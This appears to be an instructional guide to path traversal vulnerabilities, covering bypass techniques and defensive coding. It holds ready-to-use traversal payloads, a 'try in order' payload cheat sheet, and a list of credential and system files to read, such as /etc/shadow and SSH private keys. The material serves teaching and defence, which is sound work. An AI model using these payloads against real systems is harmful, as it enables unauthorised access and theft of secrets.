# Path Traversal

## Table of Contents

1. [What Is Path Traversal?](#1-what-is-path-traversal)
2. [Core Concept: How the Attack Works](#2-core-concept-how-the-attack-works)
3. [Common Bypass Techniques](#3-common-bypass-techniques)
   - 3.1 [Simple Traversal (No Defenses)](#31-simple-traversal-no-defenses)
   - 3.2 [Absolute Path Bypass](#32-absolute-path-bypass)
   - 3.3 [Nested Traversal Sequences](#33-nested-traversal-sequences)
   - 3.4 [URL Encoding Bypass](#34-url-encoding-bypass)
   - 3.5 [Required Start-of-Path Bypass](#35-required-start-of-path-bypass)
   - 3.6 [Null Byte Extension Bypass](#36-null-byte-extension-bypass)
4. [Defense & Prevention](#4-defense--prevention)
5. [Quick Reference Cheat Sheet](#5-quick-reference-cheat-sheet)

---

## 1. What Is Path Traversal?

Path traversal (also called **directory traversal**) is a vulnerability that allows an attacker to **read — and sometimes write — arbitrary files** on the server running an application by manipulating file path inputs.

Files that may be exposed include:

- Application source code and data
- Back-end credentials and config files
- Sensitive OS files (e.g. `/etc/passwd`, `windows\win.ini`)

In the worst case, write access leads to full server compromise.

### Simple Analogy

Imagine a librarian who fetches any book you name from shelf `/var/www/books/`. You ask for `../../../secret_vault/passwords`. The librarian blindly walks three floors up from the shelf and returns the passwords file — because you used the stairs (`../`) they didn't know to block.

### Relationship to Input Validation Flaws

Path traversal is a **subtype of improper input validation**. The application trusts user-supplied filenames and passes them directly to filesystem APIs without verifying that the resolved path stays within the intended directory.

---

## 2. Core Concept: How the Attack Works

### The Vulnerable Pattern

A typical vulnerable application builds a file path by concatenating a fixed base directory with user input:

```
Base directory:  /var/www/images/
User input:      218.png
Resolved path:   /var/www/images/218.png   intended
```

Because the application never validates that the resolved path stays inside the base directory, an attacker can supply traversal sequences instead:

```
User input:      ../../../etc/passwd
Resolved path:   /var/www/images/../../../etc/passwd
                 → /etc/passwd                         unintended
```

### The `../` Sequence

`../` is a standard filesystem directive meaning **"go up one directory level"**. It is valid on all operating systems:

| OS | Valid sequences |
|----|-----------------|
| Unix/Linux | `../` |
| Windows | `..\` and `../` |

Three consecutive `../` steps from `/var/www/images/` reach the filesystem root `/`, after which any path can be specified.

### What the Server Reads

```
Request:
GET /loadImage?filename=../../../etc/passwd

Server resolves:
/var/www/images/../../../etc/passwd  →  /etc/passwd

Response:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

---

## 3. Common Bypass Techniques

Applications often implement defenses against path traversal. Here are the standard bypass methods for each type.

---

### 3.1 Simple Traversal (No Defenses)

**Situation:** The application performs no sanitization whatsoever.

**Payload:**
```
../../../etc/passwd          (Unix)
..\..\..\windows\win.ini     (Windows)
```

**Why it works:** The `../` sequences are passed directly to the filesystem API, which resolves them normally.

---

### 3.2 Absolute Path Bypass

**Situation:** The application strips or blocks `../` sequences, but does not validate whether the input is an absolute path.

**Payload:**
```
/etc/passwd
```

**Why it works:** Supplying an absolute path skips traversal entirely. The filesystem API resolves it directly from root, ignoring any base directory the application intended.

---

### 3.3 Nested Traversal Sequences

**Situation:** The application strips `../` in a single non-recursive pass (strips the sequence once and uses whatever remains).

**Payload:**
```
....//....//....//etc/passwd
```

**How it's constructed:**
```
Original:   ....//
Strip ../   → ../        ← inner sequence revealed after outer is stripped
Result:     ../../../etc/passwd after three rounds
```

**Why it works:** After stripping the inner `../` from `....//`, the remaining characters form a new `../` sequence. A single-pass strip never loops back to check again.

**Variations:**
```
....\/....\/....\/etc/passwd
```

---

### 3.4 URL Encoding Bypass

**Situation:** The web server or application strips traversal sequences from URL-decoded input before passing it to the filesystem API.

**Payloads (in order of increasing encoding depth):**

| Encoding | Payload |
|----------|---------|
| URL encoded | `%2e%2e%2f` → `../` |
| Double URL encoded | `%252e%252e%252f` → `../` |
| Non-standard encodings | `..%c0%af` or `..%ef%bc%8f` |

**Full example:**
```
filename=..%252f..%252f..%252fetc/passwd
```

**Why it works:** The server decodes `%25` → `%`, producing `%2e%2e%2f`. The application then decodes again: `%2e%2e%2f` → `../`. The first-pass sanitization never saw a `../` to strip.

---

### 3.5 Required Start-of-Path Bypass

**Situation:** The application validates that the filename **starts with** an expected base path (e.g. `/var/www/images`), but doesn't validate the final resolved path.

**Payload:**
```
/var/www/images/../../../etc/passwd
```

**Why it works:** The input passes the prefix check because it starts with `/var/www/images`. After the check, the filesystem API resolves the full path, and the `../` sequences walk out of the base directory.

---

### 3.6 Null Byte Extension Bypass

**Situation:** The application validates that the filename **ends with** an expected file extension (e.g. `.png`), appending it if missing or rejecting input that doesn't match.

**Payload:**
```
../../../etc/passwd%00.png
```

**Why it works:** `%00` is a null byte — a string terminator in many languages (C, PHP, older Java). The application's extension check sees `.png` at the end and passes. The filesystem API (written in a lower-level language) stops reading the string at `%00`, so the `.png` is silently dropped and `/etc/passwd` is opened.

> **Note:** Null byte injection is less effective on modern runtimes (Python, Java 8+, .NET) that handle strings differently, but still appears in legacy codebases.

---

## 4. Defense & Prevention

### Core Principle: Don't Pass User Input to Filesystem APIs

The most effective fix is to **avoid letting user input touch filesystem APIs altogether**. Many features that load files can be redesigned to use internal IDs or whitelisted mappings instead.

```python
# Vulnerable
filename = request.params['filename']
open(BASE_DIR + filename)

# Safe alternative — map IDs to filenames server-side
FILE_MAP = {'1': 'product1.png', '2': 'product2.png'}
filename = FILE_MAP.get(request.params['id'])
if filename:
    open(BASE_DIR + filename)
```

### Strategy 1: Whitelist Permitted Values

If the set of valid filenames is known, compare user input against an explicit whitelist before any filesystem operation:

```python
ALLOWED = {'218.png', '219.png', '220.png'}
if filename not in ALLOWED:
    raise Exception("Invalid filename")
```

### Strategy 2: Canonicalize and Verify the Final Path

If arbitrary filenames must be accepted, resolve the full path after appending user input and verify it still starts with the intended base directory:

```java
File file = new File(BASE_DIRECTORY, userInput);
if (!file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    throw new SecurityException("Path traversal attempt blocked");
}
```

**Why canonicalization matters:** `getCanonicalPath()` (Java) and `os.path.realpath()` (Python) resolve all `../`, symlinks, and encoding tricks — giving the true final path regardless of how input was obfuscated.

### Strategy 3: Strict Input Validation

If canonicalization isn't available, enforce strict character allowlists on the input itself — reject anything that isn't alphanumeric or an expected extension:

```python
import re
if not re.match(r'^[a-zA-Z0-9_\-]+\.(png|jpg|gif)$', filename):
    raise ValueError("Invalid filename")
```

### Strategy 4: Two Layers of Defense

Use both strategies together. Input validation catches obvious attacks early; canonical path verification is the safety net for bypasses:

```
User input → Validate characters/format → Append to base dir → Canonicalize → Verify prefix → Open file
```

---

## 5. Quick Reference Cheat Sheet

### Signs an Endpoint May Be Vulnerable

- Takes a `filename`, `path`, `file`, `doc`, `page`, or `include` parameter
- Serves files from disk (images, PDFs, templates, configs)
- Returns different errors for "file not found" vs "permission denied" (oracle)
- Error messages reveal filesystem paths or OS details

### Payload Progression (Try in Order)

```
1. ../../../etc/passwd                        simple traversal
2. /etc/passwd                                absolute path bypass
3. ....//....//....//etc/passwd               nested sequences
4. ..%2f..%2f..%2fetc/passwd                  URL encoded
5. ..%252f..%252f..%252fetc/passwd            double URL encoded
6. ..%c0%af..%c0%af..%c0%afetc/passwd        non-standard encoding
7. /var/www/images/../../../etc/passwd        prefix bypass
8. ../../../etc/passwd%00.png                 null byte bypass
```

### Target Files Worth Reading

| OS | File | Contents |
|----|------|----------|
| Linux/Unix | `/etc/passwd` | User accounts |
| Linux/Unix | `/etc/shadow` | Password hashes (if readable) |
| Linux/Unix | `/etc/hosts` | Host mappings |
| Linux/Unix | `/proc/self/environ` | Environment variables (may hold secrets) |
| Linux/Unix | `~/.ssh/id_rsa` | SSH private key |
| Windows | `\windows\win.ini` | System configuration |
| Windows | `\windows\system32\drivers\etc\hosts` | Host mappings |
| Any | App config files | DB credentials, API keys, secrets |

### Common Bypass Summary

| Defense Applied | Bypass Technique | Example Payload |
|----------------|-----------------|-----------------|
| None | Simple traversal | `../../../etc/passwd` |
| Strips `../` | Absolute path | `/etc/passwd` |
| Strips `../` (non-recursive) | Nested sequences | `....//....//....//etc/passwd` |
| Decodes then strips | URL / double encoding | `..%252f..%252f..%252fetc/passwd` |
| Checks path prefix | Prefix + traversal | `/var/www/images/../../../etc/passwd` |
| Checks file extension | Null byte | `../../../etc/passwd%00.png` |

---
